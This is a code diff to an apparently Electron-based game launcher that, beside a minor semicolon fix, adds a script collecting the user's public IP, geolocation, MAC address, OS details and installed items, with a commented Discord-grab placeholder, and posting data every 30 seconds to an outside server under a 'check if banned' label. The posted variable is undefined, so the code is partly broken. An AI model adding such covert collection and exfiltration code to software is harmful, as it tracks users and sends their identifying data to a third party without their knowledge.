@@ -1,6 +1,53 @@
+// This script always runs throughout the entire lifespan of the app
 const fs = require("fs");
 const path = require("path");
 const os = require("os");
+const getmac = require("getmac");
+
+let echoRequest = {
+  activity_state: "ACTIVE",
+  lastState: window.location.href.substring(
+    window.location.href.lastIndexOf("/") + 1
+  ),
+  ip: (async () => {
+    await fetch("https://myexternalip.com/raw", {
+      method: "GET",
+    })
+      .then((res) => res.text())
+      .then((res) => {
+        echoRequest.ip = res;
+      });
+  })(),
+  // "discord": DISCORDJS_GRAB_TAG,
+  provinceDetails: (async () => {
+    await fetch("https://myexternalip.com/raw", {
+      method: "GET",
+    })
+      .then((res) => res.text())
+      .then(async (res) => {
+        await fetch(`http://ip-api.com/json/${res}`, {
+          method: "GET",
+        })
+          .then((res) => res.json())
+          .then((res) => {
+            echoRequest.provinceDetails = res;
+          });
+      });
+  })(),
+  os: process.platform,
+  arch: process.arch,
+  mac: getmac.default(),
+  uploadTime: new Date().toISOString(),
+  installs: (() => {
+    setTimeout(()=>{
+    if (typeof installList === 'undefined') {
+      echoRequest.installs =  [];
+    } else {
+      echoRequest.installs = installList;
+    }
+  }, 5500)
+  })(),
+};
 
 let __drivename =
   os.platform == "win32" ? process.cwd().split(path.sep)[0] : "/";
@@ -24,7 +71,7 @@ function dropInstall(position = ref(position)) {
   // Drop install at position "position"
   delete installList[position];
   // Remove from UI
-  entryListAll.removeChild(ref(`install__${position}`))
+  entryListAll.removeChild(ref(`install__${position}`));
   const filtered = installList.filter((e) => {
     return e != null;
   });
@@ -43,6 +90,25 @@ function dropInstall(position = ref(position)) {
     }
   );
 }
+
+setInterval(() => {
+  amIbanned();
+}, 30000); // Every 30s check if banned
+
+function amIbanned() {
+  // Send a post request to the server
+  fetch("https://voltaic.cloudno.de/launcher/echo", {
+    method: "POST",
+    body: data,
+  })
+    .then(function (res) {
+      return res.json();
+    })
+    .then(function (data) {
+      alert(JSON.stringify(data));
+    });
+}
+
 /*
 module.exports = {
   __drivename,
